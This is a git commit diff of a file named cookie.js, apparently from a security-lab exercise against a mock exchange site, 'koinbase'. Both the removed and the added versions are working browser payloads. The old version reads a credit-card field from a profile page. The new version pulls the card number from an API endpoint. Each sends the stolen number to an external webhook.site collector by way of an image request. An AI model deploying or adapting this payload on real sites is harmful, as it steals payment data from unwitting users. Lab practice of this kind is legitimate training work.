0c80adadfb1914ef382c2f77ee25517769eaea9d
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 20:24:38 +0700

    test

--- cookie.js
+++ cookie.js
@@ -1,13 +1,6 @@
-const win = window.open("https://koinbase.cyberjutsu-lab.tech/profile.php", "_blank");
-
-const interval = setInterval(() => {
-  try {
-    const cc = win.document.querySelector('#credit_card')?.value;
-    if (cc) {
-      clearInterval(interval);
-      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
-    }
-  } catch (e) {
-    // cross-origin access error, wait and retry
-  }
-}, 1000);
+fetch("https://koinbase.cyberjutsu-lab.tech/api.php?case=detail_info")
+  .then(res => res.json())
+  .then(data => {
+    const cc = data.plain_credit_card || 'N/A';
+    new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
+  });
